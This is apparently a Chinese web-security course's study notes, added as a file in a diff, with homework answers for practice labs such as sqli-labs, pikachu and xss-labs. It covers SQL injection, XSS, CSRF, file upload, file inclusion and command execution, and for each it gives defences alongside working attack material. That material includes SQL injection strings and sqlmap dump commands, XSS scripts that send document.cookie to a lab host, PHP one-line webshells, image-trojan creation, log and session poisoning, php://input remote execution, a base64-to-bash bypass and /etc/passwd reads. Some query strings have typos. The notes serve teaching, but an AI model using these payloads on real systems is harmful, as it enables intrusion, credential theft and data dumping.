@@ -1,0 +1,601 @@
+第1章-SQL 注入攻击、第2章-跨站脚本攻击xss、第3章-跨站请求伪造、第4章-文件上传漏洞、第5章-文件包含漏洞、第6章-命令执行漏洞
+-------------------------第1章-SQL 注入攻击-------------------------
+SQL注入原理：SQL注入指的是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串（参数过滤不严格），最终达到欺骗服务器执行恶意的SQL命令。
+网站数据处理主要分为三层。
+第一层:表示层可以用HTML代码，CSS / Javascript代码等实现。前端代码可以实现网页的布局和设计。该层也可以称为显示层。也就是说，打开浏览器可以看到的网页。
+第二层:业务层：该层负责处理数据。常用的代码语言是PHP，JSP，Java等。使用这些后台处理语言的算法来处理前台返回的数据。如有必要将进行数据库操作，然后将结果返回到前端网页。
+第三层:数据层：这是用于存储数据的数据库。业务层的操作可用于添加，删除或修改数据库。
+
+SQL注入所有种类：字符型，数字型，布尔盲注，报错注入，延迟注入，联合注入（union），堆叠，长字符截断/SQL约束攻击，二次注入，宽字节（GBK）。
+
+select * from users where user_name= 'username' and password= 'password'
+可能存在sql注入漏洞的参数位置：user_name和password
+
+提交username参数值：aaa' or 1=1 #
+' or 1=1     #万能密码
+select * from users where user_name= 'aaa' or 1=1 #' and password= 'password'
+等于
+select * from users where user_name = ' aaa' or 1=1
+
+SQL Server数据库漏洞利用，函数和说明，ppt24页，了解
+
+Mysql常见函数：
+select  system_user();                #系统用户名
+select  user();                            #用户名
+select  current_user();             #当前web系统使用的用户名
+select  database();                    #数据库名称
+select  version();                           #mysql版本号
+select  @@datadir;                              #mysql安装路径
+select  @@version_compile_os;       #mysql安装所在的操作系统版本
+
+1.MySQL中的注释：
+#
+--    #--后必须跟一个空格
+/*  */             #注释
+like操作符，模糊查询，
+_    #单个字符通配符
+%    #多个字符通配符
+[常见语句]
+order by  列名  #攻击者通常会注入Order by语句来判断此表的列数。
+select * from users   order by   username
+select * from users   order by   7
+
+报错注入（行显错式注入、非盲注）：可以使用insert、update、delete等语句进行显错式注入攻击
+
+limit语句
+limit 0,1   #从偏移量（下索引）0开始读取第1条（最大数目）数据
+limit  1    #从下索引0开始读取第1条数据（表示返回最大的记录行数目）
+
+UNION也是一个经常被使用的数据库语句，也就是常说的联合查询注入。
+select * from users   where  id=-1  union  select 1,2,3    #假设这个表有3列
+select * from users   where  id=-1  union  select 1,2,3  
+select * from users where user_name= '-1'  union  select 1,2,3  and password= 'password'
+联合查询注入的目的：union或union all
+
+updatemxl(XML数据,XPath表达式,替换的值)   #用于修改XML类型的数据
+updatexml (XML_document,XPath_string,new_value);    #输入内容不符合xpath语法就报错了，我们注入利用的就是这一点，构造payload。
+如何让全部的数据都校验失败呢。使用concat在需要的数据前面加上一个XPATH校验失败的东西就可以了。
+0x7e用来校验，version()是我们想要的数据，concat用来连接它们两个
+首先看看0x7e这个东西，它是 ~ 的16进制用来校验，但也不用被0x7e固定化了，只要能做到校验那填什么都可以。
+0x7e   #0x十六进制占位符,7e对应的是十六进制~
+0x3d  #0x十六进制占位符,3d对应的是十六进制=
+0x3a  #0x十六进制占位符,3d对应的是十六进制:
+0x5c  #0x十六进制占位符,5c对应的是十六进制\
+?id=1' and updatexml(1,concat(0x3d,database()),1)%23
+?id=1' and updatexml(1,concat(0x5c,database()),1)%23
+
+其他函数：extractvalue(XML_document,XPath_string)    #输入内容不符合xpath语法就报错了
+?id=1' or extractvalue(1,concat(0x3d,@@datadir))%23
+
+group_concat(username)    #显示结果username，以逗号分开显示在同一行
+select  concat("123","456");  #显示结果123456
+concat(0x3d,database())
+concat(0x5c,database())
+
+select  concat_ws('=',"123","456");    #追加显示结果123=456
+
+盲注：不显示错误,盲注一般分为：基于布尔的盲注、基于时间的盲注和基于报错的盲注。
+
+[基于布尔的盲注]
+left(字符串,长度);    
+substr(字符串,起始位置,截取字符个数/长度);  #参数说明:
+ascii();    #返回ascii值
+length();   #返回字符串长度
+
+1' and length(database())>5   #首先要猜测数据库名字符长度
+1' and ascii(substr(database(),1,1))>90 #  #猜测数据库名称的字符组成元素
+
+[基于时间的盲注]
+sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应。
+select if(length(database())>=8,sleep(60),1)     #延迟4秒返回结果，观察浏览器的延迟响应情况
+
+[基于报错的盲注]
+?id=1' or extractvalue(1,concat(0x3d,@@datadir))%23    
+
+?id=1' union select 1,count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a --+
+#爆破当前数据库的版本
+
+?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
+#爆破当前数据库的用户发现当前的用户为root
+
+[堆查询注入、堆叠注入]
+分号“;”是用来表示一条sql语句的结束，查询多条sql语句。
+mysqli_multi_query()    #支持堆查询，执行一个或多个针对数据库的查询。多个查询用分号进行分隔。
+
+[cookie注入]
+request("xxx")，cookie里面的参数，并未进行筛选，之后的原理与一般sql注入一致。
+cookie:username=admin     #cookie注入，username参数可能存在sql注入漏洞
+
+[ http头部注入(cookie注入)]
+HTTP头部字段User-Agent、Referer、Cookie、X-Forwarded-For等，所以就会产生http头注入的情况。
+
+课外：
+referer注入，它利用了HTTP请求中的referer
+XFF注入是一种Web应用程序安全漏洞，它利用了HTTP请求中的X-Forwarded-For头字段来欺骗应用程序以绕过IP过滤或身份验证控制。
+
+[二次注入、二阶注入]
+攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。
+例子：先添加admin--恶意sql语句，再修改admin密码，在登陆。
+
+[长字符截断/SQL约束攻击]长字符串截断注入是利用数据库表中的长度限制产生的一种漏洞，在整个利用过程中可以不输入任何敏感字符。
+例如：在mysql中的一个设置里有一个sql_mode选项，当sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时（MySQL默认 sql_mode为default），MySQL对插入超长的值只会提示warning，而不是error，这样就会导致一些截断问题。 
+username  varchar(5)      admin      ,添加"admin                  "
+
+[宽字节注入]
+在防御SQL注入的时候，多采用过滤特殊字符，或者使用函数将特殊字符转化为实体，例如添加“\”字符转义。
+宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。
+函数：preg_replace()
+PHP 自带一些转义特殊字符的函数，如addslashes()，mysql_real_escape_string()，mysql_escape_string()等，这些函数可用来防止 SQL 注入。
+
+补充说明：utf-8为单字节编码，GBK(gb2312)为宽字节编码，如果采用utf-8编码，则不会出现宽字节注入。
+-----url编码-----
+%20   空格
+%21    !
+%22    "
+%23    #
+%24   $
+%25   %
+%26   &
+%27   '
+%28   (
+%29   )
+%30—%39：0-9
+%3d   =
+%3a    :
+%2F   /
+%2e    .
+%5c   \ 
+
+%df%5c%27 union  select 1,2,3 %23
+%aa%5c%27 union  select 1,2,3 %23
+http://www.mytju.com/classcode/tools/urldecode_gb2312.asp
+
+GBK编码的特性，其中两个字节可以表示一个汉字，%df%5c组成了一个汉字。
+
+宽字节注入的条件：
+a.数据库编码：数据库需要使用GBK编码。这是因为宽字节注入依赖于GBK编码的特性，其中两个字节可以表示一个汉字。
+b.应用程序编码：应用程序的编码通常为UTF-8，这意味着在处理输入时，会将多字节字符（如GBK编码的字符）视为单独的字节。
+c.转义函数或配置：应用程序使用了转义函数，如addslashes()或开启了PHP的magic_quotes_gpc，这会导致输入中的敏感字符（如单引号）被转义。
+d.输入构造：攻击者通过在输入中插入特定的字符序列（如%df或%81），这些序列在GBK编码中对应于汉字，从而绕过转义机制。
+e.闭合SQL语句：通过上述手段，攻击者可以构造出能够闭合SQL语句的输入，进而执行SQL注入攻击。
+
+SQL注入所有种类：字符型，数字型，布尔盲注，报错注入，延迟注入，联合注入（union），堆叠，长字符截断，二次注入，宽字节（GBK）。
+
+SQL注入常用工具：
+Pangolin、Havij、sqlmap、BBQSQL、NoSQLMap、burp、啊D注入、明小子
+SQLMap支持五种不同的注入模式：
+1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行
+（即页面返回时间是否增加）来判断。
+3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+4、联合查询注入，可以使用union的情况下的注入。
+5、堆查询注入，可以同时执行多条语句的执行时的注入。
+sqlmap -u  “http://www.vuln.cn/post.php?id=1”     #链接或url地址
+–level  3   （检测共5级，级别越高，检测越全面）
+sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11”
+
+-D   test       #数据库名称
+-T   users    #表名称
+-C  "username,passwdord"    #指定列名
+-columns   #列集合
+--batch   ##一路回车，默认yes
+--flush-session    ##清洗缓存
+--dbs   ##显示所有数据库名称
+--is-dba   ##判断当前数据库是否为root权限
+--current-db   ##当前网站数据库名称'security'
+--current-user   ##当前用户名
+--passwords  ##数据库密码，默认输入y，选择第1个模板
+-dump-all   ##脱库，所有数据库
+--dump   -D “数据库名称”   ##脱库，指定的数据库名称
+
+[post检测的三种方式]
+sqlmap -u http://10.30.71.119:8080/sqli-labs-master/less-24/ --forms --current-db    --forms  ##表单检测
+sqlmap -r “c:\tools\request.txt”     #-r用作数据包request.txt检测
+sqlmap -u http://10.30.71.119:8080/sqli-labs-master/less-24/   --data "userid=aaa&passwd=bbbb"
+
+SQl注入的防御方式：
+1.对用户的参数/输入验证和过滤，特殊字符转义和过滤
+2.存储过程是在数据库端预编译并执行的，用户输入的数据不直接参与构建SQL命令。
+3.用户授予数据库的最小权限
+4.使用web防火墙(waf)和入侵检测ids
+5.预编译语句，不直接将用户输入拼接到SQL语句中。
+6.安全函数addslashes()，mysql_real_escape_string()，mysql_escape_string()
+
+information_schema库  #mysql所有信息数据库（例如:所有的数据库名称和表名都存放在此）是一个存放了当前数据库管理系统中所有数据库信息的一个数据库。
+schemata表   #所有mysql数据库的数据库名称。information_schema.schemata表：此表存放了当前数据库管理系统下所有的数据库，效果等同于show databases;
+tables表         #所有mysql数据库表名。information_schema.tables表: 此表存放了当前数据库管理系统下所有数据库的表，效果等同于所有数据库下show tables的合集。
+columns表    #所有mysql数据库列名。information_schema.columns表：此表存放了当前数据库管理系统中所有的列名。
+
+---------------作业---------------
+1、HTTP状态码区别。
+答案：
+1)301: 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。
+2)302: 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI。
+3)400: a.语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。b.请求参数有误。
+4)401: 当前请求需要用户验证。
+5)403：Forbidden，服务器已经理解请求，但是拒绝执行它。
+6)404：Not Found请求失败，服务器无法根据客户端的请求找到资源（网页）。
+7)500：Internal Server Error服务器遇到了不知道如何处理的情况。
+8)503：Service Unavailable服务器没有准备好处理请求。由于超载或系统维护，服务器暂时的无法处理客户端的请求。
+
+2、什么是SQL注入，常见的注入类型有那些？
+答案：
+SQL注入：
+SQL注入的分类：字符型，数字型，布尔盲注，报错注入，延迟注入，联合注入（union），堆叠，长字符截断，二次注入，宽字节（GBK）。
+
+3、针对SQL注入，目前的防御办法有哪些？
+答案：SQL注入防御办法：
+
+4、什么是WebShell？
+Webshell就是以asp、php、jsp或cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门、web木马、大马小马、一句话木马。
+危害：窃取用户数据、删除web页面、修改主页等。
+
+5、SQL注入漏洞工具利用
+要求如下：
+1)使用sqlmap工具对靶机环境Less-5环境爆出当前系统数据库名；
+sqlmap.py     -u "less-5/?id=1"   --current-db
+
+2)使用sqlmap对靶机环境Less-5环境判断是否是dba权限；
+sqlmap.py     -u "less-5/?id=1"   --is-dba 
+
+3)使用sqlmap对靶机环境Less-5环境成功脱security数据库；
+sqlmap.py     -u "less-5/?id=1"   --dump    -D  "security"
+
+4)使用sqlmap对靶机环境Less-11环境爆出所有数据库名称。
+sqlmap.py     -u "less-11"    --dbs 
+
+6、SQL注入漏洞手工注入题目。
+要求如下：
+1)在靶机环境Less-1环境下判断系统所在表有多少列；
+less-1/?id=1 %27order  by  6
+less-1/?id=1 %27order  by  3
+2)在靶机环境Less-2环境下查出数据库名字和版本；
+select  database();                    #数据库名称
+select  version();                        #mysql版本号
+less-2/?id=-1 %27   union  select  1,database(),version()%23   
+
+3)在靶机环境Less-3环境下爆所有数据库名称
+less-3/?id=-1 %27   union  select  1,2,group_concat(databases)  from information.schemata%23      
+
+4)在靶机环境Less-4环境下爆security数据库下所有表；
+less-4/?id=-1 %27   union  select  1,2,group_concat(table_name)  from information.tables  where  table_schema='security' %23      
+
+5)在靶机环境Less-4环境下爆security数据库下users表所有数据。
+less-4/?id=-1 %27   union  select  1,group_concat(username),group_concat(password)  from ueses%23      
+
+利用SQL注入漏洞进行攻击的一般步骤包括：识别注入点and\or\%27\%22、构造恶意输入union、updatexml、执行非预期查询--+、#、获取敏感数据或执行恶意操作database()\version()。
+
+------------------------第2章-XSS跨站脚本攻击-------------------------
+跨站脚本( Cross-site scripting，XSS)是一种经常出现在Web应用程序中的安全漏洞，是由于Web应用程序对于用户的输入未过滤或过滤不足而产生的。攻击者利用Web安全漏洞把恶意的脚本代码(通常包括
+HTML代码或Javascript脚本)输入到网页之中，当其他用户浏览这些网页时，其中的恶意代码就会自动执行，受害用户就可能遭受到 Cookie资料窃取、会话劫持、钓鱼欺骗等各种攻击。
+危害：
+1、修改网页的内容
+2、页面内的内容可以被发往任何地方，包括 Cookie，盗用
+3、使得其他类型的攻击更加容易，像CSRF、Session Attack
+4、重定向用户到其他的网页或者网站
+5、在网站上挂木马程序、网络钓鱼、xss蠕虫
+6、攻击者可以利用 iframe、 frame、 XMLHttpRequest等方式，以受害者的身份执行一些管理操作，如修改个人信息、删除博客
+一般分类：反射、存储、DOM
+非持久性xss：反射、DOM。四大特点：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。
+持久性xss：存储。持久型 XSS 的三大特点：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。
+<script>alert(XSS);</script>
+<script>document.location="http://10.30.71.119:8080/cookie.php?cookie="+document.cooke;</script>
+
+由HTTP请求中的数据（包括URL参数、表单中的值、HTTP头以及cookie）导致的XSS是反射型XSS；
+由存储在后端数据库或者文件系统的数据导致的XSS是存储型XSS；  #参考phpstudy小皮面板存储xss漏洞
+由DOM的数据导致的XSS就是基于DOM的XSS，DOM的XSS发生于客户端处理内容的阶段。
+
+反射型：
+交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等。
+存储型：
+交互的数据会被存在数据库中，永久性存储，一般出现在留言板，注册等页面。
+DOM型：
+不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，大部分属于反射型。
+
+E:\2.3 应用软件\专业软件
+pikachu靶场—管理工具—XSS后台：admin\123456
+
+xss/xss_reflected_get.php?message=<script>alert(123456);</script>&submit=submit
+xss/xsspost/xss_reflected_post.php   #登录后，<script>alert(123456);</script>
+
+<script>document.location = 'http://10.30.71.119:8080/pikachu-master/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
+##后台查看即可
+
+利用和绕过XSS漏洞：
+[反射性xss(get)]
+<script>alert(1);</script>
+[反射性xss(post)]
+<script>alert(1);</script>
+[存储型xss]
+<script>alert(1);</script>
+[DOM型xss]
+' onclick="alert('xss')">
+[DOM型xss-x]
+' onclick="alert('xss')">
+[xss之盲打]
+pikachu-master/vul/xss/xssblind/admin.php
+[xss之过滤]
+<ScRiPT>alert("111")</ScRIPT>
+[xss之htmlspecialchars
+ ' onclick='alert(111)'
+[xss之href输出]
+javascript:alert(111)
+[xss之js输出]
+'</script><script>alert(document.cookie)</script>
+';alert(document.cookie);//
+防御XSS漏洞：
+1.首先是输入、输出过滤。对诸如(script、img、a)等标签进行过滤。
+2.其次是编码。像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。
+3.最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御
+4.设置HTTP-only Cookie禁止获取cookie数据
+5.WAF应用防火墙设置
+6.设置CSP内容审核，就是白名单制度
+
+------------------CSRF跨站请求伪造-------------------
+概念：
+CSRF漏洞：跨站请求伪造。CSRF是一种劫持受信任用户向服务器发送非预期请求的攻击方式。通常情况下，CSRF攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。因此CSRF攻击也被称为"one click"攻击。
+
+区别：
+xss：跨站脚本攻击、诱骗用户点击恶意链接盗取用户 cookie 进行攻击、不需要用户进行登录、xss 除了利用 cookie 还可以篡改网页等。
+csrf：跨站请求伪造、无法获取用户的cookie 而是直接冒充用户、需要用户登录后进行操作。
+
+防御方法：
+1、设置来源referer字段，但是并不是所有服务器在任何时候都可以接受referer字段，所以这个方法存在一定的局限性。阻止不明外域的访问
+2、设置验证码；在用户操作的过程中设置身份确认的验证码，该方法会很有用，不过验证码频繁的话会影响用户体验。
+3、设置token值，在用户请求中设置一个随机没有规律的token值可以有效的防止攻击者利用漏洞攻击。
+4、双重Cookie验证
+5、使用JSON API，限制跨域
+
+分类：GET类型、POST类型、Token类型
+
+------------------文件上传-------------------
+原理：由于对上传的文件，文件内容、文件格式、文件后缀检查不严谨，导致上传恶意脚本文件，对服务器进行未授权和恶意操作。
+
+绕过方式：
+Content-Type:image/png
+点空格点
+用hex修改特殊文件后缀，当0x81~0x99放在文件名结尾时，不符合操作系统命名规范，字符会被自动去掉。
+::$data
+大小写、双写文件后缀
+条件竞争
+%00截断——需要满足以下条件：1.  php版本小于5.3.4   2.  php的magic\_quotes\_gpc为OFF状态
+图片木马（文件包含漏洞一起使用）
+copy    1.png /b + 1.php /a    2.png      #恶意代码加入到程序的头部或尾部
+/b 表示一个二进制文件
++ 表示将多个文件合并成一个文件
+/a 表示一个ASCII文本文件
+jpg; jpe; jpeg：头（2bytes）FF D8      尾（2bytes）FF D9
+gif：头（6bytes）47 49 46 38 37 61
+png：头（8bytes） 89 50 4E 47 0D 0A 1A OA
+图片的二次渲染
+Apache/IIS解析     ####test.asp;abc.jpg会被IIS6当成test.asp来解析执行。 test.php.jpg会被apache当成test.php来解析执行。
+
+防御方法：
+1、验证上传文件的类型。
+2、限制上传文件的大小，设定合理的文件大小限制。
+3、对上传的文件进行内容扫描。
+4、存储文件时进行加密和权限控制：在存储文件时，应该对文件进行加密处理，并设置严格的权限控制，防止其他用户或攻击者访问和篡改服务器上的文件。同时，管理员应该定期检查服务器的日志和安全事件，及时发现和处理安全问题。
+5、WAF应用防火墙设置
+6、使用随机数改写文件名和文件路径（隐藏文件访问路径）。
+
+文件上传漏洞高危触发点：
+存在文件上传功能的地方都有可能存在文件上传漏洞，比如相册、头像上传，视频、照片分享。
+论坛发帖和邮箱等可以上传附件的地方也是上传漏阔的高危地带，
+另外文件管理器这样的功能也有可能被攻击者所利用。
+
+--------------文件包含漏洞-------------------------
+常见的进行文件包含的函数
+(1)PHP：include()、include_once()、require()、require_once()、fopen()、readfile()等；
+(2)JSP：ava.io.File()、java.io.FileReader()等；
+(3)ASP：include file、include virtual等。
+include()函数：文件包含失败，会产生警告，脚本会继续执行
+include_once()函数：与include() 功能相同，文件只会被包含一次
+require() 函数：文件包含失败时，会产生错误，直接结束脚本执行
+require_once() 函数：与require() 功能相同 ，文件只会被包含一次
+
+文件包含漏洞通常是由于程序未对用户可控的文件包含变量进行严格过滤，导致用户可随意控制被包含文件的内容，并使得Web应用程序将包含恶意代码的文件当成正常脚本解析执行。
+文件包含漏洞的危害非常严重，它可直接导致网站被上传木马，进而造成服务器执行不可预知的恶意操作，如网页算改、敏感数据泄漏、代码远程执行等。
+
+按照被包含的文件所在位置来划分，可将文件包含漏洞分为本地文件包含漏洞（Local File Inclusion，LFI）和远程文件包含漏洞（Remote File Inclusion，RFI）两类。
+本地文件包含漏洞危害：
+1）包含同目录下的文件： ?file=lfi.txt
+2）目录遍历： ?file=../../../lfi.txt
+3）包含图片木马： ?file=lfi.jpg%00    #联合使用
+4）包含日志： ?file=../../../../var/log/apache/error.log
+5）包含session： 
+远程文件包含漏洞危害：
+<?php file_put_contents('shell.php','<?php phpinfo();?>');?>
+伪协议
+
+防御方式：
+1、对用户输入的参数进行严格的审查，可以有效防止文件包含漏洞的产生
+2、防止变量覆盖：应尽量避免文件包含的路径中出现用户可控制的变量。
+3、定制安全的Web Service环境，检查配置文件，中间件安全配置
+
+--------------命令执行漏洞-------------------------
+原理：命令执行漏洞的根本原因是系统未正确的过滤用户输入的数据，导致部分数据被当作代码执行。
+分类：代码执行漏洞、命令执行漏洞（函数调用漏洞）
+代码执行：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()、ob_start()
+命令执行：system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``
+
+绕过：
+[windows]
+|        #是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。
+&      #先执行Command 1，不管是否成功，都会执行Command 2
+||       #逻辑或，Command 1不成功，执行Command 2或Command 1成功，不执行Command 2
+&&    #先执行Command 1，执行成功后执行Command 2，否则不执行Command 2
+[linux多一个命令]
+;或%OA      #多命令按照顺序执行
+
+利用命令执行漏洞：
+cat${IFS}/etc/passwd    #空格绕过
+echo d2hvYW1p | base64 -d | bash   #通过编码的方式来绕过
+>abc     #在Linux下会在当前目录创建一个名为abc的空文件，利用这种方法绕过
+id root \&\& whoami    #特殊转译
+vps    #nc无回显，端口转发，监听
+
+防御：
+1.验证输入。需要对所有用户能影响到的参数进行验证，确保其在合法范围内（除非能保证该参数在之前被验证过）
+2.合理利用转译函数。escapeshellarg和escapeshellcmd。
+3.避免危险操作。要尽量避免使用这些灵活的特性，在有相同的常规代码可以代替的情况下，就不要使用它们。
+4.行为限制。不要以高权限来运行Web应用。
+5.定期检查更新软件版本有利于保障系统安全。
+
+暴力破解漏洞：应用程序在认证机制中未对登录尝试的次数、频率或模式进行限制，使得攻击者可以通过暴力破解的方式尝试猜测用户的账号和密码。
+
+like操作符，模糊查询，
+_    #单个字符通配符
+%    #多个字符通配符
+*    #不限字符通配符
+
+delete是把目录撕了，truncate是把书的内容撕下来烧了，drop是把书烧了
+
+-----------------操作题--------------
+1、SQL注入漏洞手工注入题目。
+要求如下：
+1)在靶机环境Less-1环境下判断系统所在表有多少列；
+2)在靶机环境Less-2环境下查出数据库名字和版本；
+3)在靶机环境Less-3环境下爆所有数据库名称
+4)在靶机环境Less-4环境下爆security数据库下所有表；
+5)在靶机环境Less-4环境下爆security数据库下users表所有数据。
+答案：
+1)
+判断注入点'或",如果有错误回显，sql语句闭合处理，order by n,并且加mysql注释处理，例如#	
+2)
+判断注入点'或",如果有错误回显，sql语句闭合处理，假设当前表有3列，页面展示为2列，举例?id=-1 union select 1,database(),version() %23;	
+3)
+判断注入点'或",如果有错误回显，sql语句闭合处理，假设当前表有3列，页面展示为2列，group_concat()函数统计系统库关键数据库字段。
+举例?id=-1 union select 1,2,group_concat(关键的数据库列名)  from 系统数据库 %23;
+4)
+判断注入点'或",如果有错误回显，sql语句闭合处理，假设当前表有3列，页面展示为2列，group_concat()函数统计系统库关键表字段。
+举例?id=-1 union select 1,2,group_concat(关键的表名)  from 系统数据库表名 where  表名='security'%23;
+5)判断注入点'或",如果有错误回显，sql语句闭合处理，假设当前表有3列，页面展示为2列，group_concat()函数统计系统库关键表字段。
+举例?id=-1 union select 1,group_concat(username),group_concat(password)  from security.users %23;	
+
+2、SQL注入漏洞工具利用。
+要求如下：
+1)使用sqlmap工具对靶机环境Less-5环境爆出当前系统数据库名；
+2)使用sqlmap对靶机环境Less-5环境判断是否是dba权限；
+3)使用sqlmap对靶机环境Less-5环境成功脱security数据库；
+4)使用sqlmap对靶机环境（post类型）Less-11环境爆出所有数据库名称。
+答案：
+1)sqlmap.py -u "url" 	  --current-db
+2)sqlmap.py -u "url" 	  --is-dba	
+3)sqlmap.py -u "url" 	  --dump -D "security"	
+4)
+sqlmap.py -u "url"  --forms  --dbs
+sqlmap.py   -r  post数据包  --dbs	
+sqlmap.py   -u "url"   -data  "post请求"--dbs		
+
+3、XSS漏洞手工测试题目。
+要求如下：
+1)在靶场环境xss-labs的Less-3下进行XSS漏洞测试；
+2)在靶场环境xss-labs的Less-6下进行XSS漏洞测试；
+3)在靶场环境xss-labs的Less-7下进行XSS漏洞测试；
+4)在靶场环境xss-labs的Less-8下进行XSS漏洞测试；
+5)在靶场环境xss-labs的Less-10下进行XSS漏洞测试。
+答案：
+1)<sciprt>alert(1);</script>	
+2)大小写：<Sciprt>alert(1);</scripT>	
+3)事件：' onclick=alert(1);	
+4)标签：<a href="javascript:alert(a)" />	
+5)双写：<scipsciprtrt>alert(1);</scsciprtript>		
+
+4、PHP代码执行和命令执行函数漏洞利用，利用所学知识进行漏洞复现。
+要求如下:
+1)利用所学任意一个PHP代码执行函数，以火狐的插件HackBar作实验, 并利用蚁剑验证是否可以利用；
+1)利用所学任意一个PHP命令执行函数，以火狐的插件HackBar作实验并利用蚁剑验证是否可以利用；
+答案：操作步骤截图
+1)1.php
+<?php   eval($_GET['a']);   ?>
+浏览器
+1.php?a=phpfinfo();       返回结果phpinfo信息
+ 2)
+1.php
+<?php  system($_GET['a']);   ?>
+浏览器
+1.php?a=calc.exe;       返回结果弹出计算器
+
+5、跨站请求伪造漏洞实战。
+要求如下：
+1)在靶机环境CSRF(get)下，完成跨站请求伪造漏洞实战；
+2)在靶机环境CSRF(post)下，完成跨站请求伪造漏洞实战；
+3)在靶机环境CSRF Token下，完成跨站请求伪造漏洞实战。
+答案：操作步骤截图
+1）CSRF基于已知cookie，伪造url，一般用于修改数据。
+举例：
+1.PHP?passwd=123    伪造一个GET请求html页面1.PHP?passwd=999，诱导该账户访问。
+2)
+CSRF基于已知cookie，伪造url，一般用于修改数据。
+举例：
+1.PHP?passwd=123    伪造一个POSThtml页面1.PHP?passwd=999，诱导该账户访问。	 
+3)Token：服务器发给客户端用于校验的一次性令牌
+token存储在数据库，可以设置时效性，可以用burpsite爆破，也可以通过reponse去查看tonken是否存在在reponse页面内，进行利用。
+	
+6、文件上传漏洞实战。
+要求如下：
+1)在靶机环境client check下编写一个webshell，成功上传，并用蚁剑连接测试；
+2)在靶机环境MIME type下编写一个webshell，成功上传，并用蚁剑连接测试；
+3)在靶机环境getimagesize下编写一个webshell，成功上传，并用蚁剑连接测试。
+答案：
+1)利用点空格点后缀或者修改十六进制后缀，进行文件后缀检验绕过。	  
+2)利用burpsite修改Content-Type:image/png，进行文件类型检验绕过。	 
+3)copy 1.jpg/b+1.php/a  2.jpg   生成图片木马，利用文件包含漏洞解析图片木马。
+
+7、PHP本地文件包含漏洞利用，利用所学知识进行复现。
+要求如下:
+1)利用session进行PHP本地文件包含漏洞实验；
+2)利用Apache日志文件进行PHP本地文件包含漏洞实验。
+答案：操作步骤截图
+1)1.php
+<?php   $a=$_GET['a']);   include("$a");  ?>
+D:\phpStudy\PHPTutorial\tmp\tmp     #phpinfo();
+a.获取Session保存文件路径
+先访问到tmp目录下session文件， 1.php?a=/tmp/sess_xxxxxxxxxxxxx
+tngdc31412sbo1goan8r6fscv7
+b.Session可控session.php?a=<?php  phpinfo(); ?> 写入sess_xxxxxxxxxxxxx
+c.存在文件包含漏洞
+再次访问1.php?a=/tmp/sess_xxxxxxxxxxxxx，可以返回phpinfo信息。	
+ 
+2)httpd.conf修改配置 CustomLog "logs/access.log" combined
+a.获取apache日志文件路径，日志记录已开启
+<?php   $a=$_GET['a']);   include("$a");  ?>
+apache开启日志记录功能， 1.php?a=D:\phpStudy\PHPTutorial\apache\logs\access.log
+b.存在文件包含漏洞
+1.php?a=<?php  phpinfo(); ?> 
+再次访问日志，可以返回phpinfo信息。
+		
+8、PHP远程文件包含漏洞利用，利用所学知识进行复现。
+要求如下:
+1)利用伪协议php://input生成一句话木马脚本，用火狐的插件HackBar做实验，验证此协议可用性。
+2)利用伪协议data://text/plain执行系统命令，利用base64编码转换调用系统计算器，用火狐的插件HackBar做实验，验证此协议可用性。
+答案：操作步骤截图
+php.ini修改配置allow_url_include = On
+1）1.php
+<?php   $a=$_POST['a']);   include("$a");  ?>
+利用方式：
+1.php?a=php://input   
+post：<?php system('calc.exe');  ?>
+2）
+1.php
+<?php   $a=$_GET['a']);   include("$a");  ?>
+利用方式：
+1.php?a=data://text/plain;base64,<?php system('calc.exe');  ?>
+
+【代码审计】
+1、sql注入：sql
+2、文件上传：upload、上传
+3、命令执行或代码执行：system、assert、eval
+难点：
+[windows]
+|        #是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。
+&      #先执行Command 1，不管是否成功，都会执行Command 2
+||       #逻辑或，Command 1不成功，执行Command 2或Command 1成功，不执行Command 2
+&&    #先执行Command 1，执行成功后执行Command 2，否则不执行Command 2
+[linux多一个命令]
+;或%OA      #多命令按照顺序执行
+
+4、文件包含漏洞：include、require
+?filename=php://filter/convert.base64-encode/resource=lfi.php    #对本地磁盘文件进行读写，用于读取php源代码内容
+php://input   #开启远程文件包含，php.ini配置文件allow_url_include=on
+data://text/plain  #开启远程文件包含，php.ini配置文件allow_url_include=on
